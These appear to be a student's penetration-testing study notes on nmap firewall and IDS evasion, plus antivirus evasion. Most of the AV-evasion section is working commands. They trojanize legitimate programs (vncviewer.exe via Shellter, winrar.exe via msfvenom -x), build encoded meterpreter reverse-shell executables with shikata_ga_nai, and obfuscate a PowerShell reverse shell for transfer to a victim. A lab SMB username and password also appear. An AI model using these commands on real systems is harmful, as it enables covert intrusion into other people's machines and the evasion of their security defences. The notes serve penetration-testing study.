
#### Firewall Detection & IDS Evasion
1. `-sA` : ACK flag is used to send ACK set packet to target and tells the STATE , whether FILTERED (_FW is there_)or UNFILTERED (_FW is NOT there_).
	-> `nmap -T4 -Pn IP -sA -p 3389,445`

###### Firewall Evasions techniques 
1. Fragment Packets
		-> `-f` : automatically fragments packets 
		-> `-f --mtu <val>` : manually set value to fragment packets

2. Decoy IPs (IP Spoofing)
	-> `-D` : used to spoof IP , you can use gateway IP to spoof which looks less suspicious
	-> `--data-lenght` : used to set a custom data length. like 200, 1000 etc
	-> `-g` : set the custom port with Decoy IP , like set it to 53 make it less suspicious
	-> `nmap -T4 -sS -p- IP -f --data-lenght 200 -D 192.168.23.1 -g 53`

###### useful flags
1. `--host-timeout TIME` : give up on host scanning on a particular IP is doesn't respond for a particular time. ---> `--host-timeout 20s`
2. `--scan-delay TIME` : use to delay b/w packets sent to the target , best to do a stealthy scan. ---> `--scan-delay 15s`

# LAB Commands
```bash
nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

--> `--script-args` : used to pass arguments to the script like here _smbusername_ & _smbpassword_.

## Types of AVs
1. _Signature Based_ : based to signature hashes
2. _Heuristic Based_ : based on patter of system calls etc
3. _Behavior Based_ : based on behavious

-> _On-Disk_ Evasion Techniques
1. Obfuscation
2. Encoding
3. Packing 
4. Crypters

-> _In-Memory Evasion Techniques_
1. Focuses on manipulation of memory and does not write data / payload on disk.
2. Inject payload into a process using various Windows API.
3. Payload in then executed in memory in a separate thread.

#### Evasion with SHELLTER

-> to install `shellter`
-> Set your `dpkg` to install `32 bit` softwares 
-> `sudo dpkg --add-architecture i386`
-> `sudo apt install shellter`
-> `sudo apt-get install wine32` : 
	wine is a compatibility layer , used to execute `.exe` on Linux systems.

--> using `shellter` in linux to obfuscate payload
	1. `sudo wine shellter.exe`
	2. select option accordingly
	3. -> use `/usr/share/windows-binaries/vncviewer.exe` as a payload to transfer as it is a legitimate software , even if AVs are there they don't remove it.
	4. then give the path for this executable
	5. set the payload type , LHOST , LPORT etc.
	6. then the actual file will be replaced with the malicious one
	7. send the malicious software to the windows and try to execute 
	8. get the shell on meterpreter or terminal , according to the payload you have set

#### Obfuscating PowerShell Code
-> malicious power-shell script can be detected by the AVs easily.
-> to prevent the ps.1 scripts being detected.

`Invoke-Obfuscation` : compatibility power-shell command & script obfuscator

1. `git clone` https://github.com/danielbohannon/Invoke-Obfuscation
2. `pwsh` : command to run powershell utility in linux terminal
3. `Import-Module Invoke-Obfuscation.psd1`
4. `SET PATH /PATH/TO/PS_REVSHELL.ps1` : can take from _PAYLOADOFALLTHINGS_
5. choose option _AST_ then _ALL_ : from the given list 
6. run and it will print the obfuscated code.
7. cope , save it in file and transfer to the victim.

###### Encoding MSF Payload (Evade AVs)
-> Encoding of payloads is done in order to evade from AVs
-> `x86/shikata_ga_nai` : excellent encoder to encode both windows and linux
-> `cmd/powershell_base64` : excellent encoder to encode powershell scripts.

1. `-e x86/shikata_ga_nai` : just add this flag while generating any payload 
	-> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.11.121 LPORT=1234 -e x86/shikata_ga_nai -f exe > file.exe`

2. Iterations increment : increasing the number of iteration will help the payload more to not get detected by the AVs.
	-> `-i NUMBER` : example : `-i 10` | `-i 20` 
	-> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.11.121 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > file.exe`


###### Injecting Payload into Windows Portable Executables

1. `-x FILE` : download a legitimate executable , example winrar for windows. This will hide your payload in winrar.exe and when the user try to execute it then the payloadd will executed.
	-> download a winrar.exe legitimate file.
	-> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.11.121 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe -x ~/Downloads/winrar.exe > file.exe`

#post-exploitation 
-> always use `/post/windows/manage/migrate` module in meterpreter after getting meterpreter reverse shell.
-> It will migrate the payload process to something else like notepad.exe and the AVs will not be able to detect it.

